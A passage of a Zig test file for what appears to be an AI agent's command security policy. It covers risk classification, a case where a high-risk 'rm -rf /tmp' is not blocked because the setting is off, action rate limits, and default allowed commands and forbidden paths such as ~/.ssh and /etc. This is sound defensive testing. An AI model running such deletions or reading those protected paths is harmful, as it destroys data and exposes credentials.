    const risk = try p.validateCommandExecution("touch test.txt", false);
    try std.testing.expectEqual(CommandRiskLevel.medium, risk);
}

test "validate low risk command passes without approval" {
    const p = SecurityPolicy{};
    const risk = try p.validateCommandExecution("ls -la", false);
    try std.testing.expectEqual(CommandRiskLevel.low, risk);
}

test "validate high risk not blocked when setting off" {
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .autonomy = .full,
        .block_high_risk_commands = false,
        .allowed_commands = &allowed,
    };
    const risk = try p.validateCommandExecution("rm -rf /tmp", false);
    try std.testing.expectEqual(CommandRiskLevel.high, risk);
}

// ── Rate limiting edge cases ────────────────────────────────────

test "no tracker means no rate limit" {
    const p = SecurityPolicy{ .tracker = null };
    try std.testing.expect(try p.recordAction());
    try std.testing.expect(!p.isRateLimited());
}

test "record action returns false on exact boundary plus one" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 1,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(try p.recordAction()); // 1 allowed
    try std.testing.expect(!try p.recordAction()); // 2 blocked
}

// ── Default allowed/forbidden lists ─────────────────────────────

test "default allowed commands includes expected tools" {
    var found_git = false;
    var found_npm = false;
    var found_cargo = false;
    var found_ls = false;
    for (&default_allowed_commands) |cmd| {
        if (std.mem.eql(u8, cmd, "git")) found_git = true;
        if (std.mem.eql(u8, cmd, "npm")) found_npm = true;
        if (std.mem.eql(u8, cmd, "cargo")) found_cargo = true;
        if (std.mem.eql(u8, cmd, "ls")) found_ls = true;
    }
    try std.testing.expect(found_git);
    try std.testing.expect(found_npm);
    try std.testing.expect(found_cargo);
    try std.testing.expect(found_ls);
}

test "default forbidden paths includes sensitive dirs" {
    var found_etc = false;
    var found_ssh = false;
    var found_proc = false;
    for (&default_forbidden_paths) |path| {
        if (std.mem.eql(u8, path, "/etc")) found_etc = true;
        if (std.mem.eql(u8, path, "~/.ssh")) found_ssh = true;
        if (std.mem.eql(u8, path, "/proc")) found_proc = true;
    }
    try std.testing.expect(found_etc);
    try std.testing.expect(found_ssh);
    try std.testing.expect(found_proc);
}
